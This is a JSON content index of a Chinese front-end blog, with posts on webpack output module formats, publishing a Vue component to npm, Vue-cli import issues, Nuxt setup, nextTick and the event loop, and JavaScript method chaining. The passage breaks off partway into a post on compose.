{"meta":{"title":"Recall Hyx","subtitle":"Your star","description":null,"author":"Recall HYX","url":"https://recallhyx.github.io"},"pages":[{"title":"tags","date":"2018-02-07T12:45:00.000Z","updated":"2018-02-07T12:47:28.043Z","comments":false,"path":"tags/index.html","permalink":"https://recallhyx.github.io/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2018-02-07T12:43:56.000Z","updated":"2018-02-07T12:47:29.537Z","comments":false,"path":"categories/index.html","permalink":"https://recallhyx.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"从Webpack的Output看模块规范","slug":"从Webpack的Output看模块规范","date":"2018-06-13T13:55:27.000Z","updated":"2018-06-13T13:56:03.795Z","comments":true,"path":"2018/06/13/从Webpack的Output看模块规范/","link":"","permalink":"https://recallhyx.github.io/2018/06/13/从Webpack的Output看模块规范/","excerpt":"","text":"libraryTarget从上一篇Vue组件开发流程中，我们可以看到 webpack 里面的一个设置 output ：12345678output: &#123; path: config.build.assetsRoot, filename: 'vue-crop-avatar.min.js', // 输出的名字 publicPath: '/dist/', // 输出的目录 library: 'vue-crop-avatar', // 引入组件时的名字 libraryTarget: 'umd', // 输出格式 umdNamedDefine: true // 是否将模块名称作为 AMD 输出的命名空间&#125;, 其中，libraryTarget 可选的值有以下几个： var this commonjs commonjs2 amd umdlibraryTarget 就是选择怎么暴露 library ，即打包后的代码以什么格式输出var-暴露为一个变量var 是 libraryTarget 的默认值，如果要用 var ，就一定要设置 library 的值，因为打包后会是这种形式：1var MyLibrary = _entry_return_; 其中，MyLibrary 就是 library 的值，如果没有这个值，就会出错。_entry_return_ 是由 webpack 生成的，是一个函数。使用方法：12// 另外的脚本里MyLibrary.doSomething() this-通过在对象上赋值暴露如果要使用 this，推荐设置 library 的值，因为打包后是这种形式：1this[\"MyLibrary\"] = _entry_return_; 如果没有 library 那么所有 _entry_return_ 的东西都会赋值给 this使用方法：123// 另外的脚本里this.MyLibrary.doSomething();MyLibrary.doSomething(); // 如果 this 是 window 模块定义系统commonjslibraryTarget: &quot;commonjs&quot; 入口起点的返回值将使用 output.library 中定义的值，分配给 exports 对象。这个名称也意味着，模块用于 CommonJS 环境，打包后的形式：1exports[\"MyLibrary\"] = _entry_return_; 使用方法：12// 另外的脚本里require(\"MyLibrary\").doSomething(); commonjs2libraryTarget: &quot;commonjs2&quot; 入口起点的返回值将分配给 module.exports 对象。这个名称也意味着模块用于 CommonJS 环境，打包后的形式：1module.exports = _entry_return_; 使用方法：12// 另外的脚本里require(\"MyLibrary\").doSomething(); commonjs 和 commonjs2两者在 webpack 里面没有区别，用还是那么用，从定义上讲，Commonjs 规范仅仅定义了 exports ，module.exports 是 node 对 Commonjs 规范的具体实现 。 amdlibraryTarget: &quot;amd&quot; 将你的 library 暴露为 AMD 模块。生成的 output 将会使用 “MyLibrary” 作为模块名定义，即：123define(\"MyLibrary\", [], function() &#123; return _entry_return_; // 此模块返回值，是入口 chunk 返回的值&#125;); 使用方法：可以在 script 标签中引入脚本，也需要 requirejs123require(['MyLibrary'], function(MyLibrary) &#123; // 使用 library 做一些事……&#125;); amd 和 commonjsAMD 和 CommonJS 都是模块规范，但是这两种是竞争关系。CommonJS 规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作。AMD规范则是非同步加载模块，允许指定回调函数。由于 Node 主要用于服务器编程，模块文件一般都已经存在于本地硬盘，所以加载起来比较快，不用考虑非同步加载的方式，所以在服务端 CommonJS 规范比较适用。但是，如果是浏览器环境，要从服务器端加载模块，这时就必须采用非同步模式，因此浏览器端一般采用 AMD 规范。 umdlibraryTarget: &quot;umd&quot; 将你的 library 暴露为所有的模块定义下都可运行的方式。它将在 CommonJS, AMD 环境下运行，或将模块导出到 global 下的变量。打包后的形式：123456789101112(function webpackUniversalModuleDefinition(root, factory) &#123; if(typeof exports === 'object' &amp;&amp; typeof module === 'object') module.exports = factory(); else if(typeof define === 'function' &amp;&amp; define.amd) define([], factory); else if(typeof exports === 'object') exports[\"MyLibrary\"] = factory(); else root[\"MyLibrary\"] = factory();&#125;)(typeof self !== 'undefined' ? self : this, function() &#123; return _entry_return_; // 此模块返回值，是入口 chunk 返回的值&#125;); 这里的 root ，就是 library 的值，不设置的话，也会像不设置 this 一样，暴露到全局。既然 CommonJs 和 AMD 风格一样流行，似乎缺少一个统一的规范。所以人们产生了这样的需求，希望有支持两种风格的“通用”模式，于是通用模块规范（UMD）诞生了。不得不承认，这个模式略难看，但是它兼容了 AMD 和 CommonJS ，同时还支持老式的“全局”变量规范。 其他规范ES6 Module 和 CommonJSES6 Module 与 CommonJS 模块完全不同。它们有两个重大差异。 CommonJS 模块输出的是一个值的拷贝，ES6 Module 输出的是值的引用。 CommonJS 模块是运行时加载，ES6 Module 是编译时输出接口。 CommonJS 模块输出的是值的拷贝，也就是说，一旦输出一个值，模块内部的变化就影响不到这个值。123456789// lib.jsvar counter = 3;function incCounter() &#123; counter++;&#125;module.exports = &#123; counter: counter, incCounter: incCounter,&#125;; 上面代码输出内部变量 counter 和改写这个变量的内部方法 incCounter。然后，在 main.js 里面加载这个模块。12345var mod = require('./lib');console.log(mod.counter); // 3mod.incCounter();console.log(mod.counter); // 3 上面代码说明，lib.js 模块加载以后，它的内部变化就影响不到输出的 mod.counter 了。这是因为mod.counter 是一个原始类型的值，会被缓存。除非写成一个函数，才能得到内部变动后的值。1234567891011// lib.jsvar counter = 3;function incCounter() &#123; counter++;&#125;module.exports = &#123; get counter() &#123; return counter &#125;, incCounter: incCounter,&#125;; 上面代码中，输出的 counter 属性实际上是一个取值器函数。现在再执行 main.js ，就可以正确读取内部变量 counter 的变动了。123$ node main.js34 ES6 Module 的运行机制与 CommonJS 不一样。JS 引擎对脚本静态分析的时候，遇到模块加载命令 import，就会生成一个只读引用。等到脚本真正执行时，再根据这个只读引用，到被加载的那个模块里面去取值。换句话说，ES6 的 import 有点像 Unix 系统的“符号连接”，原始值变了， import 加载的值也会跟着变。因此，ES6 Module 是动态引用，并且不会缓存值，模块里面的变量绑定其所在的模块。1234567891011// lib.jsexport let counter = 3;export function incCounter() &#123; counter++;&#125;// main.jsimport &#123; counter, incCounter &#125; from './lib';console.log(counter); // 3incCounter();console.log(counter); // 4 上面代码说明，ES6 Module 输入的变量 counter 是活的，完全反应其所在模块 lib.js 内部的变化。ES6 Module 不会缓存运行结果，而是动态地去被加载的模块取值，并且变量总是绑定其所在的模块。由于 ES6 输入的模块变量，只是一个“符号连接”，所以这个变量是只读的，对它进行重新赋值会报错。 参考：Webpack 中文指南Module 的加载实现[译]神马是AMD, CommonJS, UMD?","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"webpack","slug":"webpack","permalink":"https://recallhyx.github.io/tags/webpack/"}]},{"title":"Vue组件开发流程","slug":"Vue组件开发流程","date":"2018-06-12T13:19:17.000Z","updated":"2018-06-13T14:01:34.939Z","comments":true,"path":"2018/06/12/Vue组件开发流程/","link":"","permalink":"https://recallhyx.github.io/2018/06/12/Vue组件开发流程/","excerpt":"","text":"需求分析首先分析好需求，确定做什么，怎么做。画流程图或原型图能够帮我们梳理一下重点，难点。推荐工具：ProcessOn、Axure 开发组件 推荐组件：awasome-vue 测试开发完组件后需要测试一下，这里使用 npm link 的方式，简单快速。首先我们在开发组件的项目下，打开命令行，输入：npm link 这个时候就会提示已经连接到项目 avatar 下然后我们新建一个项目，在新项目目录下，打开命令行，输入：npm link avatar， 连接成功，在 VsCode 里面，也可以在 node_modules看到被连接的项目 然后我们就正常引入组件，在新的项目里面测试看看功能是否正常 打包package.json修改package.json 有几个地方需要修改的，因为我们要发布组件，所以 private 选项要改成 false， 然后把 name，version，description，author，看自己的情况修改。注意：name 字段如果和 npm 上面已有的包重名，会发布不成功的。以后修改了组件但是发布的时候 version 没有修改也会发布失败。 添加 添加 files 字段，这个字段是指定打包之后，包中存在的文件夹 添加 main 字段，这个字段是当我们用 import avatar from &#39;vue-crop-avatar&#39; 时，会引入的文件即我们用 import avatar from &#39;vue-crop-avatar&#39; 实际上是引入 vue-avatar.min.js 这个文件 添加 keywords 字段，这个字段可以在 npm 上搜索的时候更容易搜索到这个包 添加 license 字段，代表使用的协议 添加 repository 字段，即 Github 地址1234\"repository\":&#123; type: \"git\", url: \"git+https://github/com/your/repository\"&#125; index.js我们在 src 目录下新建一个 index.js 的文件，这个文件主要是用来给 webpack 设置入口的，1234567// index.jsimport Avatar from './components/Avatar.vue'Avatar.install = function(Vue)&#123; Vue.component(Avatar.name,Avatar);&#125;export default Avatar 主要是定义了 install 方法，这个方法会在 Vue.use() 的时候被调用，其实就是在 Vue 下注册一个组件。 配置webpack我们自己在 build 目录下新建一个 webpack.generate.conf.js 文件：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899// webpack.generate.conf.js'use strict'const path = require('path')const utils = require('./utils')const config = require('../config')const vueLoaderConfig = require('./vue-loader.conf')const ExtractTextPlugin = require(\"extract-text-webpack-plugin\");const UglifyJSPlugin = require('uglifyjs-webpack-plugin');const OptimizeCSSPlugin = require('optimize-css-assets-webpack-plugin')var webpack = require('webpack');function resolve (dir) &#123; return path.join(__dirname, '..', dir)&#125;module.exports = &#123; entry: &#123; app: './src/index.js' &#125;, output: &#123; path: config.build.assetsRoot, filename: 'vue-crop-avatar.min.js', publicPath: '/dist/', library: 'vue-crop-avatar', libraryTarget: 'umd', // 输出格式 umdNamedDefine: true // 是否将模块名称作为 AMD 输出的命名空间 &#125;, externals: &#123; vue: &#123; root: 'Vue', commonjs: 'vue', commonjs2: 'vue', amd: 'vue' &#125; &#125;, resolve: &#123; extensions: ['.js', '.vue', '.json'], alias: &#123; 'vue$': 'vue/dist/vue.esm.js', '@': resolve('src'), &#125; &#125;, module: &#123; rules: [ &#123; test: /\\.vue$/, loader: 'vue-loader', options: vueLoaderConfig &#125;, &#123; test: /\\.js$/, loader: 'babel-loader', include: [resolve('src'), resolve('test'), resolve('node_modules/webpack-dev-server/client')] &#125;, &#123; test: /\\.(png|jpe?g|gif|svg)(\\?.*)?$/, loader: 'url-loader', options: &#123; limit: 10000, name: utils.assetsPath('img/[name].[hash:7].[ext]') &#125; &#125;, &#123; test: /\\.(mp4|webm|ogg|mp3|wav|flac|aac)(\\?.*)?$/, loader: 'url-loader', options: &#123; limit: 10000, name: utils.assetsPath('media/[name].[hash:7].[ext]') &#125; &#125;, &#123; test: /\\.(woff2?|eot|ttf|otf)(\\?.*)?$/, loader: 'url-loader', options: &#123; limit: 10000, name: utils.assetsPath('fonts/[name].[hash:7].[ext]') &#125; &#125;, ], &#125;, plugins: [ new webpack.DefinePlugin(&#123; 'process.env': &#123; NODE_ENV: JSON.stringify('production') &#125; &#125;), new webpack.optimize.UglifyJsPlugin( &#123; minimize : true, sourceMap : false, mangle: true, compress: &#123; warnings: false &#125; &#125;), ]&#125; 之所以不在 webpack.prod.conf.js 的基础上修改，是因为我们发布组件不需要太多的配置，这样就足够了，需要注意的配置也就只有 entry 字段和 output 字段。entry 字段需要改成我们之前新建的 index.js，这样 webpack 就会根据这个文件把依赖的东西都打包。output 字段就是输出的东西，12345678output: &#123; path: config.build.assetsRoot, filename: 'vue-crop-avatar.min.js', // 输出的名字 publicPath: '/dist/', // 输出的目录 library: 'vue-crop-avatar', // 引入组件时的名字 libraryTarget: 'umd', // 输出格式 umdNamedDefine: true // 是否将模块名称作为 AMD 输出的命名空间&#125;, 其中，输出格式有一些区别，就是各种规范，可以看这篇文章从Webpack的Output看模块规范 命令我们在 package.json 的 script 字段可以自己写命令，123456\"scripts\": &#123; \"dev\": \"webpack-dev-server --inline --progress --config build/webpack.dev.conf.js \", \"start\": \"npm run dev\", \"build\": \"node build/build.js\", \"build-component\": \"webpack --config build/webpack.generate.conf.js \" // 自己写的&#125;, 就是指定 webpack 用哪个配置文件进行打包然后我们npm run build-component就能在项目里面看到新增 dist 目录和输出的文件。 发布要发布到 npm 首先要有 npm 的账号，到官网注册一个账号在项目下 npm login，输入用户名，密码，然后 npm publish ，如果失败了，请修改 package.json 文件中的 name 和 version。 使用先将我们之前 npm link 取消，用 npm unlink avatar 就能解绑，然后我们输入 npm install vue-crop-avatar 即 package.json 里面的 name 字段的内容1234567891011121314151617181920212223&lt;template&gt; &lt;div class=\"center\"&gt; &lt;vue-crop-avatar :isRound=\"true\" :minCropWidth=\"200\" :minCropHeight=\"200\" :maxCropWidth=\"500\" :maxCropHeight=\"500\" @getrawdata=\"getCanvasData\" :defaultImgPath=\"'../../static/logo.png'\" &gt;&lt;/vue-crop-avatar&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import VueCropAvatar from 'vue-crop-avatar'export default &#123; name: 'HelloWorld', components:&#123; VueCropAvatar &#125;,&#125;&lt;/script&gt; 可以看到能够正常使用了。 最后感悟因为是第一次发布组件，整个过程中踩的坑比开发组件中踩的坑还要多，但是踩过坑之后，解决问题就很快了","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://recallhyx.github.io/tags/vue/"}]},{"title":"Vue-cli引入问题","slug":"Vue-cli引入问题","date":"2018-05-25T14:08:07.000Z","updated":"2018-05-25T14:11:46.876Z","comments":true,"path":"2018/05/25/Vue-cli引入问题/","link":"","permalink":"https://recallhyx.github.io/2018/05/25/Vue-cli引入问题/","excerpt":"","text":"前言最近在各种方面的引入时出现了一些问题。比如，用到剪切图片的第三方库 cropperjs，但是在引入的时候却不能正常显示。 引入第三方库的问题一开始像官网的写法一样先 npm install cropperjs然后在 index.html 里面插入以下代码12&lt;link href=\"./node_modules/cropperjs/dist/cropper.min.css\" rel=\"stylesheet\"&gt;&lt;script src=\"./node_modules/cropperjs/dist/cropper.esm.js\"&gt;&lt;/script&gt; 但是效果却是这样的： 而且页面拉到下面，滚动滚轮的时候下面两张图还会放大缩小，根本就不是想要的效果(╯‵□′)╯︵┻━┻。 如果我们用把 index.html 中的代码换成 cdn：12&lt;link href=\"https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.3.6/cropper.css\" rel=\"stylesheet\"&gt;&lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.3.6/cropper.js\"&gt;&lt;/script&gt; 结果又正常引入了 解决方法其实在 Vue-cli 里面，引入插件需要在组件里面的两个地方引入：在 &lt;script&gt; 标签中引入 js 文件，在 &lt;style&gt; 标签中引入 css 文件：123456789101112// component.vue&lt;template&gt;...&lt;/template&gt;&lt;script&gt;import Cropper from 'cropperjs' // 引入 js 文件...&lt;/script&gt;&lt;style&gt;@import '../../node_modules/cropperjs/dist/cropper.min.css'; // 引入 css 文件...&lt;/style&gt; 删掉 index.html 里面的引入，看看效果： 成功啦。如果想全局使用，还是一样的，只不过引入位置的组件改为 App.vue。 图片路径的问题一开始想着用 Vue-cli 自带的 logo.png 图片做测试，但是在直接对图片的 src 属性赋值的时候 img.src = ../assets/logo.png 图片却找不到，而在 &lt;img&gt; 标签里面的 src 属性赋值图片却可以正常显示。 解决方法 使用 require ，因为在 assets 中的文件会被 webpack 处理，所以要使用的话就需要 img.src = require(&#39;../assets/logo.png&#39;) 把 logo.png 放到 static 目录下，因为在 static 目录下的文件不会被webpack 处理，所以通过正常的方式就能直接使用 img.src = &#39;/static/logo.png&#39; 使用绝对路径引用。","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://recallhyx.github.io/tags/vue/"}]},{"title":"Nuxt入门","slug":"Nuxt入门","date":"2018-05-16T02:04:48.000Z","updated":"2018-05-16T02:05:55.431Z","comments":true,"path":"2018/05/16/Nuxt入门/","link":"","permalink":"https://recallhyx.github.io/2018/05/16/Nuxt入门/","excerpt":"","text":"什么是Nuxt简单来说，Nuxt 就是基于 Vue 的服务端渲染框架（SSR），使用 Nuxt 能够让我们更快速的完成开发。 服务端渲染的好处都有啥？我们用框架（Angular2，React，Vue）开发 SPA 应用，都会面临一个问题就是首屏加载速度慢的问题。对于 SSR 来说，服务器返回的是（结构相对完整的）HTML文件，（通过解析HTML文件），浏览器就能渲染出页面。而对 CSR 来说，浏览器拿到的只是包含 JavaScript 代码的 HTML 文件，（换句话，在浏览器渲开始渲染出页面之前，需要动态创建 HTML 标签）。这也就意味着，SSR 可以让浏览器在边下载 JavaScript 文件的同时边渲染 HTML 页面，换句话说，浏览器再也不需要等到所有的 JavaScript 文件下载并执行完之后才去渲染页面。 安装使用需要提前安装 vue-cli：npm install -g vue-cli然后利用 vue-cli 安装使用：vue init nuxt-community/starter-template &lt;project-name&gt; 最后在项目目录下安装依赖：npm install等到安装完毕，npm run dev 就能启动项目，在浏览器输入 http://localhost:3000 就能看到项目 目录结构 注意两个东西： pages 文件夹和 components 文件夹，这两个文件夹下都是 *.vue文件 ，但是Nuxt.js 会依据 pages 目录中的所有 *.vue 文件生成应用的路由配置，而 components 只是用于组织应用的 Vue.js 组件，Nuxt.js 不会扩展增强该目录下 Vue.js 组件，即这些组件不会像页面组件那样有 asyncData 方法的特性。 asyncData方法会在组件（限于页面组件）每次加载之前被调用。它可以在服务端或路由更新之前被调用。你可以利用 asyncData 方法来获取数据，Nuxt.js 会将 asyncData 返回的数据融合组件 data 方法返回的数据一并返回给当前组件。 还有 assets 文件夹和 static 文件夹，对于不需要通过 Webpack 处理的静态资源文件，可以放置在 static 目录中。而资源目录 assets 用于组织未编译的静态资源如 LESS 、SASS 或 JavaScript 。 小例子资源引入问题我要使用 vuetify 这个框架，看到需要在 index.js 或 main.js 引入，但是 nuxt 并没有这两个文件，怎么办？重点就是 plugins 文件夹，我们在该文件夹目录下新建一个文件夹 vuetify.js，当然，我们需要先下载 vuetify：npm install vuetify --save：1234import Vue from 'vue'import Vuetify from 'vuetify'import 'vuetify/dist/vuetify.min.css'Vue.use(Vuetify) 然后, 在 nuxt.config.js 内配置 plugins 如下：12345678module.exports = &#123; build: &#123; vendor: ['~/plugins/vuetify'] &#125;, plugins: [ &#123;src: '~/plugins/vuetify', ssr: false&#125; ]&#125; 其实只需要配置 plugins 就可以跑起来了，实际上， vuetify 会被打包至应用的脚本代码里， 但是它属于第三方库，我们理应将它打包至库文件里以获得更好的缓存效果，所以需要在 build 里面配置 vendor。（应用代码比库文件修改频繁，应尽量将第三方库打包至单独的文件中去）。至于后面的 ssr:false ，因为我们的插件只在浏览器端使用，所以用 ssr: false 变量来配置插件只从客户端还是服务端运行。但是还没完，我们还需要引入谷歌的字体，如果我们直接使用 CDN 的话，只需要在 nuxt.config.js 里面的 head 中的 link 添加谷歌字体 CDN ：1234link: [ &#123; rel: 'icon', type: 'image/x-icon', href: '/favicon.ico' &#125;, &#123; rel: 'stylesheet', href: 'https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Material+Icons' &#125;] 但是你懂得，谷歌在墙外，所以要下载谷歌字体下来很慢很慢，所以我们就只能抛弃 CDN ，直接文件引入。我们先打开谷歌 CDN 这个链接看看有啥： 一大堆东西，都是不同的字体，我们只需要选择一种字体下载并导入即可我们在 assets 目录新建一个目录 style并创建 app.css 文件：1234567891011121314151617181920212223/* app.css*/@font-face &#123; font-family: 'Material Icons'; font-style: normal; font-weight: 400; src: local('Material Icons'), local('MaterialIcons-Regular'), url(../font/materialfont.woff2) format('woff2');&#125;.material-icons &#123; font-family: 'Material Icons'; font-weight: normal; font-style: normal; font-size: 24px; line-height: 1; letter-spacing: normal; text-transform: none; display: inline-block; white-space: nowrap; word-wrap: normal; direction: ltr; -webkit-font-feature-settings: 'liga'; -webkit-font-smoothing: antialiased;&#125; 然后在 assets 目录创建一个 font 文件夹放我们的字体文件： 接下来我们实验一下能不能成功，在 components 新建一个 expansion.vue 文件，然后从 vuetify 官网复制的例子：12345678910111213// expansion.vue&lt;template&gt; &lt;v-app&gt; &lt;v-expansion-panel&gt; &lt;v-expansion-panel-content v-for=\"(item,i) in 5\" :key=\"i\"&gt; &lt;div slot=\"header\"&gt;Item&lt;/div&gt; &lt;v-card&gt; &lt;v-card-text&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.&lt;/v-card-text&gt; &lt;/v-card&gt; &lt;/v-expansion-panel-content&gt; &lt;/v-expansion-panel&gt; &lt;/v-app&gt;&lt;/template&gt; 在 pages 的 index.vue 文件中引入我们的组件：123456789101112131415161718192021// index.vue&lt;template&gt; &lt;div&gt; &lt;expansion&gt;&lt;/expansion&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import Expansion from '~/components/expansion.vue'export default &#123; components: &#123; Expansion &#125;&#125;&lt;/script&gt;&lt;style&gt;&lt;/style&gt; 嗯，很好的工作了，接下来我们打包放到服务器上看看执行：npm generate 就会打包成文件夹 dist，里面放着我们的静态文件 把这个文件夹整个放到服务器上 怎么了，我们的图标怎么不见了？ F12 打开看一下 报错没有找到资源，我们仔细看看，发现，路径是以 http://recallhy.xin:8080/_nuxt/ 开头的，我们把资源放到的是 dist 目录下，而不是根目录下，当然会找不到资源了，所以我们要修改一下路径，在 nuxt.config.js 里，加入一段代码：123456module.exports = &#123; ... router:&#123; base: './' &#125;&#125; 然后我们再把 npm generate 生成的东西放到服务器 可以看到我们的资源可以找到了。 其实 vuetify 官方已经配好了 nuxt 的框架，直接就可以使用组件不用这么麻烦的配置，具体请看 官方github，但是我们配其他框架套路也是一样的。 暂时就是这样，以后在使用 nuxt 的过程中遇到问题会持续记录。","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"nuxt","slug":"nuxt","permalink":"https://recallhyx.github.io/tags/nuxt/"}]},{"title":"理解nextTick","slug":"nextTick","date":"2018-05-14T13:07:06.000Z","updated":"2018-05-15T01:44:51.383Z","comments":true,"path":"2018/05/14/nextTick/","link":"","permalink":"https://recallhyx.github.io/2018/05/14/nextTick/","excerpt":"","text":"前言一开始看到 nextTick 是在理解 JavaScript 事件循环的时候看到的，那个时候认为是 node 的东西，所以没怎么在意，但是后来看到 Vue 也有个地方用到了 nextTick，所以还是要花时间理解一下这个东西，看看它们的区别与联系。 node 中的 process.nextTick()在之前 事件循环 这一篇博客中可以知道有两个东西，一个叫 marcotask，另外一个叫 microtask，而 process.nextTick 是属于 microtask 的，也就是说是和 promise.then 一样，会比 setTimeout 等 marcotask 事件更先执行，但是 process.nextTick 和 promise.then 谁更先执行呢，我们看以下代码：123456789console.log(1);const promise = new Promise((resolve,reject) =&gt; &#123; console.log(2); resolve();&#125;)promise.then(() =&gt; &#123; console.log(3);&#125;);process.nextTick(() =&gt; console.log(4)); 可以看到结果： 从这里我们就可以看出来了，process.nextTick 比 promise.then 更快执行。其实，在 node，一次事件循环包括以下三个队列： 可以看到，多了一个 nextTickQueue ，它在 marcotask 之后在 microtask 之前执行，process.nextTick 就是在这个 nextTickQueue 里面，所以它会比 promise.then 先执行。 这里提一下 node 的特有的函数 setImmediate，它和 setTimeout 还有 setInterval 都是会添加到次轮循环的 marcotask，但是 process.nextTick 是添加到本轮循环的 nextTickQueue 里面。 事件循环六个阶段我们上图看到的三个队列，其实具体对应到事件循环六个阶段的几个阶段： timers I/O callbacks idle, prepare poll check close callbacks 每个阶段都有一个先进先出的回调函数队列。只有一个阶段的回调函数队列清空了，该执行的回调函数都执行了，事件循环才会进入下一个阶段。 （1）timers这个是定时器阶段，处理 setTimeout() 和 setInterval() 的回调函数。进入这个阶段后，主线程会检查一下当前时间，是否满足定时器的条件。如果满足就执行回调函数，否则就离开这个阶段。（2）I/O callbacks除了以下操作的回调函数，其他的回调函数都在这个阶段执行。 setTimeout() 和 setInterval() 的回调函数setImmediate()的回调函数用于关闭请求的回调函数，比如 socket.on(&#39;close&#39;, ...) （3）idle, prepare该阶段只供 libuv 内部调用，这里可以忽略。（4）Poll这个阶段是轮询时间，用于等待还未返回的 I/O 事件，比如服务器的回应、用户移动鼠标等等。这个阶段的时间会比较长。如果没有其他异步任务要处理（比如到期的定时器），会一直停留在这个阶段，等待 I/O 请求返回结果。（5）check该阶段执行 setImmediate() 的回调函数。（6）close callbacks该阶段执行关闭请求的回调函数，比如 socket.on(&#39;close&#39;, ...) 。 需要注意的是，Node 开始执行脚本时，会先进行事件循环的初始化，但是这时事件循环还没有开始，会先完成下面的事情。而且 process.nextTick 会在当前阶段结束前执行，microtask 会在 process.nextTick 执行完后全部执行。即每个阶段都会先执行 process.nextTick，然后执行 microtask。 同步任务发出异步请求规划定时器生效的时间执行process.nextTick()等等 最后，上面这些事情都干完了，事件循环就正式开始了。 加深印象让我们看一下一段代码：12345678910111213setImmediate(function () &#123; console.log(1); process.nextTick(function () &#123; console.log(2); &#125;);&#125;);process.nextTick(function () &#123; console.log(3); setImmediate(function () &#123; console.log(4); &#125;)&#125;);// 3 1 4 2 让我们理一下过程：首先遇到 setImmediate ，把它的回调函数放到下一轮事件循环的 marcotask。然后遇到 process.nextTick，由于先进行事件循环的初始化，会执行 process.nextTick ，输出 3 并把 setImmediate 放到下一轮事件循环的 marcotask 队列。这样，开始第一轮事件循环，由于没有 setTimeout 或者 setInterval ，所以跳过。进入下一个阶段 I/O callbacks，nextTickQuque 队列为空，继续下面的阶段直至 check 阶段，从 marcotask 队列拿出 setImmediate ，执行，输出 1，遇到 process.nextTick 放入nextTickQuque 队列。marcotask 队列不为空，继续拿出队头，执行，输出 4 ，marcotask 队列为空，在 check 阶段结束前，nextTickQuque 不为空，拿出队头，执行，输出 2 。 Vue 中的 nextTickVue 中的 nextTick 是在下次 DOM 更新循环结束之后执行延迟回调。在修改数据之后立即使用这个方法，获取更新后的 DOM。一个普遍的常识是 DOM Tree 的修改是实时的，而修改的 Render 到 DOM 上才是异步的。根本不存在什么所谓的等待 DOM 修改完成，任何时候我在上一行代码里往DOM中添加了一个元素、修改了一个 DOM 的 textContent ，你在下一行代码里一定能立马就读取到新的 DOM。虽然我们能读取到新的 DOM，但是浏览器并未渲染出来，如果我们马上在 document 获取修改的 DOM的结点，会发现并不是刚刚修改的值。这就是为什么在 Vue 中，如果在 created 事件中操作元素，会报错说提示不存在，因为 Vue 在 created 的时候还没有渲染出 UI，所以将需要的操作用 nextTick 执行或者直接在 mounted 生命周期中操作元素，这个时候 UI 就已经渲染出来了。 nextTick 使用的是 microtask ，在 marcotask 执行完毕之后就会立即执行所有microtask ，那么 flushBatcherQueue（真正修改 DOM）便得以在此时立即完成，而后，当前轮次的 microtask 全部清理完成时，执行UI rendering，把重排重绘等操作真正更新到DOM上。真正的去遍历 watcher，批处理更新是在 microtask 中执行的，而且用户在修改数据后自己执行的 nextTick(cb) 也会在此时执行 cb，他们都是在同一个 microtask 中执行。之所以要这样，是因为用户的代码当中是可能多次修改数据的，而每次修改都会同步通知到所有订阅该数据的 watcher，而立马执行将数据写到 DOM 上是肯定不行的，那就只是把 watcher 加入数组。等到当前 task 执行完毕，所有的同步代码已经完成，那么这一轮次的数据修改就已经结束了，这个时候我可以安安心心的去将对监听到依赖变动的 watcher 完成数据真正写入到 DOM 上的操作，这样即使你在之前的 task 里改了一个 watcher 的依赖100次，我最终只会计算一次 value、改 DOM 一次。一方面省去了不必要的 DOM 修改，另一方面将DOM操作聚集，可以提升 DOM Render 效率。 区别与联系在 node 里面，有一个专门的队列来存放 nextTick 中的回调函数，而 Vue 中的 nextTick 则是用 microtask 来实现，浏览器只有 marcotask 和 microtask 两种队列。 但是他们执行的时间是一样的，即是在 marcotask 执行完之后执行。 参考：Node.js的event loop及timer/setImmediate/nextTickNode 定时器详解Vue源码详解之nextTick","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"node vue","slug":"node-vue","permalink":"https://recallhyx.github.io/tags/node-vue/"}]},{"title":"JavaScript有技巧的函数","slug":"JavaScript有技巧的函数","date":"2018-04-27T12:56:10.000Z","updated":"2018-04-27T15:05:04.096Z","comments":true,"path":"2018/04/27/JavaScript有技巧的函数/","link":"","permalink":"https://recallhyx.github.io/2018/04/27/JavaScript有技巧的函数/","excerpt":"","text":"前言JavaScript 有很多有技巧的函数，这篇文章是我自己的一个记录。 链式调用看一个例子吧，我们要实现一个函数 fun ，它有以下功能：1fun(1).add(1).min(2).num // 0 这是一个很典型的例子，用到了链式调用，其核心就是返回自己，即 return this，那么我们来实现这个函数吧：1234567891011function fun(num)&#123; this.num = num; this.add = function(num)&#123; this.num+=num; return this; // 核心 &#125; this.min = function (num)&#123; this.num-=num; return this; // 核心 &#125;&#125; 然后我们要怎么用这个函数呢？如果我们直接链式调用：12fun(1).add(1).min(2);// Uncaught TypeError: Cannot read property 'add' of undefined 只有对象才能链式调用，jquery的 $ 其实是返回一个对象：12345678var obj = &#123; a:&#123; b:&#123; fun :function()&#123;console.log('b');&#125; &#125; &#125;&#125;obj.a.b.fun(); // b 既然如此，那么我们就 new 一下：12345678910111213function fun(num)&#123; this.num = num; this.add = function(num)&#123; this.num+=num; return this; // 核心 &#125; this.min = function (num)&#123; this.num-=num; return this; // 核心 &#125;&#125;var fun = new fun(1);fun.add(1).min(2).num; // 0 这样和我们一开始 fun(1).add(1).min(2).num 的调用方式差了一点，既然是要用对象，那我们用一个函数包起来不就行了嘛：123456789101112131415function Fun(num)&#123; this.num = num; this.add = function(num)&#123; this.num+=num; return this; // 核心 &#125; this.min = function (num)&#123; this.num-=num; return this; // 核心 &#125;&#125;function fun(num)&#123; return new Fun(num);&#125;fun(1).add(1).min(2).num; // 0 这就是完整版的代码了。 compose还是来看一道题 ：1234实现一个 compose 